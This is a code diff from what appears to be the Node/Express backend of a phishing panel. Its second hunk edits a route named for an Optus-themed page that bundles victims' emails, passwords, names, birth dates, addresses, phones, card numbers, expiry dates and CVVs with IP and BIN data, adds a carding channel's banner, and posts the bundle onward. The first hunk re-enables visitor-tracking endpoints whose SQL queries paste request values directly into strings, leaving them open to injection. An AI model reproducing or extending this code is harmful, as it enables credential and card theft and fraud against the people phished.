@@ -75,40 +75,40 @@ app.get("/getips", (req, res) => {
   });
 });
 
-// app.options("/giveVisitor", cors());
+app.options("/giveVisitor", cors());
 
-// app.post("/giveVisitor", (req, res) => {
-//   ip = req.body.ip;
-//   owner = req.body.owner;
+app.post("/giveVisitor", (req, res) => {
+  ip = req.body.ip;
+  owner = req.body.owner;
 
-//   panelConnection.query(
-//     `SELECT * FROM visitors WHERE ip = '${ip}' AND owner = '${owner}'`,
-//     (err, rows, fields) => {
-//       if (!rows.length) {
-//         let details = [ip, owner];
-//         let query = `INSERT INTO visitors(ip, owner) VALUES (?,?)`;
-//         panelConnection.query(query, details, (err, rows, fields) => {
-//           if (!err) res.send("Insertion Completed");
-//           else console.log(err);
-//         });
-//       } else {
-//         res.send("Already visited");
-//       }
-//     }
-//   );
-// });
+  panelConnection.query(
+    `SELECT * FROM visitors WHERE ip = '${ip}' AND owner = '${owner}'`,
+    (err, rows, fields) => {
+      if (!rows.length) {
+        let details = [ip, owner];
+        let query = `INSERT INTO visitors(ip, owner) VALUES (?,?)`;
+        panelConnection.query(query, details, (err, rows, fields) => {
+          if (!err) res.send("Insertion Completed");
+          else console.log(err);
+        });
+      } else {
+        res.send("Already visited");
+      }
+    }
+  );
+});
 
-// app.options("/getVisitors", cors());
+app.options("/getVisitors", cors());
 
-// app.get("/getVisitors/:owner", (req, res) => {
-//   owner = req.params.owner;
-//   panelConnection.query(
-//     `SELECT ip FROM visitors WHERE owner = '${owner}'`,
-//     (err, rows) => {
-//       res.send(rows);
-//     }
-//   );
-// });
+app.get("/getVisitors/:owner", (req, res) => {
+  owner = req.params.owner;
+  panelConnection.query(
+    `SELECT ip FROM visitors WHERE owner = '${owner}'`,
+    (err, rows) => {
+      res.send(rows);
+    }
+  );
+});
 
 app.options("/getRespentesting123!", cors());
 
@@ -10275,7 +10275,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `|--------- @vendetta_cccupdates  ---------|\n\n+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (bill == 100) {
         axios
           .post(
